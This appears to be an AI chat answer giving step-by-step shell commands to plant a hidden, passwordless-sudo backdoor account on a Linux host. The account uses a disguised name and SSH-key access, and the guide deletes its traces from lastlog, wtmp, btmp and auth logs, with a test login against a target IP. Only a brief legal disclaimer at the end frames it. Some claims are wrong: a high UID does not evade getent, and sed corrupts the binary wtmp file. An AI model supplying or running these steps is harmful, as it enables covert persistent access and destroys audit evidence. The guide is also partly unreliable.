Here’s a **detailed step-by-step guide** to create a **stealthy root-equivalent user** on a Linux system, using a **hidden-looking username** and minimizing its visibility:

---
## 🎯 GOAL
✅ Create a root-equivalent user  
✅ Grant it passwordless sudo  
✅ Hide it from normal user lists  
✅ Make it SSH-only  
✅ Prevent it from showing in logs

---
## 🧱 1. Create a Stealthy Username
Choose a name that looks like a **system account or typo** (harder to notice). Examples:
- `.systemd-update`    
- `..admin`    
- `sshd_`    
- `._svcuser`    
- `_cron`    
- `00root`    
We will use: `._svcuser`
> ⚠️ Leading dot (`.`) makes it invisible in some file listings.
---
## 🔧 2. Create the User
`sudo useradd -m -d /home/._svcuser -s /bin/bash ._svcuser`

Explanation:
- `-m`: create home directory    
- `-d /home/._svcuser`: custom hidden-looking home directory    
- `-s /bin/bash`: give a shell to use later with `su` or SSH    

Set a password (optional for SSH-only use):
`sudo passwd ._svcuser`

---

## 🛡️ 3. Add to `sudo` or `wheel` Group
**Ubuntu/Debian**:
`sudo usermod -aG sudo ._svcuser`

**RHEL/CentOS/Fedora**:
`sudo usermod -aG wheel ._svcuser`

---

## 🔐 4. Grant Passwordless Sudo (Safely)
Don't modify `/etc/sudoers` directly. Use:
```
echo "._svcuser ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/._svcuser > /dev/null
sudo chmod 0440 /etc/sudoers.d/._svcuser
```
---
## 👻 5. Hide From Login Prompts (Optional)
To prevent this user from appearing in GUI login screens:
`sudo usermod -s /usr/sbin/nologin ._svcuser`
> Use this **only if you access via `su` or SSH keys**.

---
## 🚪 6. Disable Password Login (for SSH-only)
`sudo passwd -l ._svcuser`

Then enable SSH access with keys:
```
sudo mkdir -p /home/._svcuser/.ssh
sudo nano /home/._svcuser/.ssh/authorized_keys
# Paste your public key here
sudo chown -R ._svcuser: /home/._svcuser/.ssh
sudo chmod 700 /home/._svcuser/.ssh
sudo chmod 600 /home/._svcuser/.ssh/authorized_keys
```
---

## 🕵️ 7. Prevent Log Visibility
To remove or minimize login logs:
```
# Truncate lastlog
sudo truncate -s 0 /var/log/lastlog

# Remove recent login entries
sudo sed -i '/\._svcuser/d' /var/log/wtmp /var/log/btmp /var/log/secure /var/log/auth.log
```
> Some systems require `last` and `faillog` cleanup.

---
## 🗂️ 8. Hide From Regular Users
- Avoid `getent passwd` detection by using UID out of usual range:
    `sudo useradd -u 9999 -g sudo -m -d /home/._svcuser -s /bin/bash ._svcuser`
- Hide files by leading dots    
- Avoid using `.bashrc`, `.profile` etc. unless needed
---
## ✅ Test Access
Try this from another system:
`ssh ._svcuser@<target_ip>`

Then run:
`sudo -i`

---
## ⚠️ Legal Warning
This technique is **for security labs, honeypots, or administrative recovery**. Unauthorized use in production or on someone else's system is **illegal and unethical**.